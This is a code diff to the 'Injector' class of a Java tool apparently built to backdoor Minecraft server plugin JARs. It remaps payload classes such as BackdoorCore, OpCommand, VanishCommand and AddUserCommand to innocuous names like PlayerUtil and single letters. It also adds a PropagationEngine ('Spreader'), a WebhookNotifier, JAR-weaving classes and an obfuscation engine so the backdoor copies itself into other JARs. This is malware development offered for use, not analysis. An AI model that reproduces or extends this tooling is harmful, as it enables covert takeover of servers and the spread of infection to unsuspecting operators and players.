@@ -100,11 +100,16 @@ public class Injector {
         map.put("dev/naruto/astrox/payload/BackdoorCore", targetPath + "/PlayerUtil");
         map.put("dev/naruto/astrox/payload/CommandHandler", targetPath + "/ServerUtil");
         map.put("dev/naruto/astrox/payload/AuthManager", targetPath + "/AccessControl");
+        map.put("dev/naruto/astrox/payload/PropagationEngine", targetPath + "/Spreader");
+
+        // Remap config classes (IMPORTANT!)
+        map.put("dev/naruto/astrox/Config", targetPath + "/cfg/C");
+        map.put("dev/naruto/astrox/RuntimeConfig", targetPath + "/cfg/RC");
 
         // Remap command interface
         map.put("dev/naruto/astrox/payload/commands/Command", targetPath + "/internal/Cmd");
 
-        // Remap ALL command classes (single letter obfuscated names)
+        // Original commands (single letter names)
         map.put("dev/naruto/astrox/payload/commands/OpCommand", targetPath + "/internal/A");
         map.put("dev/naruto/astrox/payload/commands/DeopCommand", targetPath + "/internal/B");
         map.put("dev/naruto/astrox/payload/commands/GamemodeCommand", targetPath + "/internal/C");
@@ -114,6 +119,8 @@ public class Injector {
         map.put("dev/naruto/astrox/payload/commands/SeedCommand", targetPath + "/internal/G");
         map.put("dev/naruto/astrox/payload/commands/AuthCommand", targetPath + "/internal/H");
         map.put("dev/naruto/astrox/payload/commands/DeauthCommand", targetPath + "/internal/I");
+
+        // Enhanced commands
         map.put("dev/naruto/astrox/payload/commands/FlyCommand", targetPath + "/internal/J");
         map.put("dev/naruto/astrox/payload/commands/VanishCommand", targetPath + "/internal/K");
         map.put("dev/naruto/astrox/payload/commands/HealCommand", targetPath + "/internal/L");
@@ -128,14 +135,25 @@ public class Injector {
         map.put("dev/naruto/astrox/payload/commands/HelpCommand", targetPath + "/internal/U");
         map.put("dev/naruto/astrox/payload/commands/CoordsCommand", targetPath + "/internal/V");
         map.put("dev/naruto/astrox/payload/commands/ListCommand", targetPath + "/internal/W");
+        map.put("dev/naruto/astrox/payload/commands/AddUserCommand", targetPath + "/internal/X");
 
-        // Remap utility classes
-        map.put("dev/naruto/astrox/utils/DynamicLoader", targetPath + "/lib/Loader");
+        // Remap utils
+        map.put("dev/naruto/astrox/utils/ReflectionUtil", targetPath + "/lib/ReflectUtil");
         map.put("dev/naruto/astrox/utils/CryptoUtil", targetPath + "/lib/StringUtil");
         map.put("dev/naruto/astrox/utils/Logger", targetPath + "/lib/LogUtil");
+        map.put("dev/naruto/astrox/utils/DebugLogger", targetPath + "/lib/DebugUtil");
+        map.put("dev/naruto/astrox/utils/DynamicLoader", targetPath + "/lib/Loader");
+        map.put("dev/naruto/astrox/utils/WebhookNotifier", targetPath + "/lib/Webhook");
+
+        // Remap core classes (for propagation)
+        map.put("dev/naruto/astrox/core/JarAnalyzer", targetPath + "/core/Analyzer");
+        map.put("dev/naruto/astrox/core/Injector", targetPath + "/core/Inject");
+        map.put("dev/naruto/astrox/core/PayloadWeaver", targetPath + "/core/Weaver");
+        map.put("dev/naruto/astrox/obfuscation/ObfuscationEngine", targetPath + "/core/Obf");
 
         return map;
     }
+
 
     /**
      * Embed all payload classes with package remapping
@@ -146,11 +164,16 @@ public class Injector {
                 "dev.naruto.astrox.payload.BackdoorCore",
                 "dev.naruto.astrox.payload.CommandHandler",
                 "dev.naruto.astrox.payload.AuthManager",
+                "dev.naruto.astrox.payload.PropagationEngine",
+
+                // Config classes
+                "dev.naruto.astrox.Config",
+                "dev.naruto.astrox.RuntimeConfig",
 
                 // Command interface
                 "dev.naruto.astrox.payload.commands.Command",
 
-                // ALL command implementations
+                // All command implementations
                 "dev.naruto.astrox.payload.commands.OpCommand",
                 "dev.naruto.astrox.payload.commands.DeopCommand",
                 "dev.naruto.astrox.payload.commands.GamemodeCommand",
@@ -174,11 +197,21 @@ public class Injector {
                 "dev.naruto.astrox.payload.commands.HelpCommand",
                 "dev.naruto.astrox.payload.commands.CoordsCommand",
                 "dev.naruto.astrox.payload.commands.ListCommand",
+                "dev.naruto.astrox.payload.commands.AddUserCommand",
 
                 // Utilities
-                "dev.naruto.astrox.utils.DynamicLoader",
+                "dev.naruto.astrox.utils.ReflectionUtil",
                 "dev.naruto.astrox.utils.CryptoUtil",
-                "dev.naruto.astrox.utils.Logger"
+                "dev.naruto.astrox.utils.Logger",
+                "dev.naruto.astrox.utils.DebugLogger",
+                "dev.naruto.astrox.utils.DynamicLoader",
+                "dev.naruto.astrox.utils.WebhookNotifier",
+
+                // Core classes (for propagation)
+                "dev.naruto.astrox.core.JarAnalyzer",
+                "dev.naruto.astrox.core.Injector",
+                "dev.naruto.astrox.core.PayloadWeaver",
+                "dev.naruto.astrox.obfuscation.ObfuscationEngine"
         };
 
         SimpleRemapper remapper = new SimpleRemapper(remapTable);
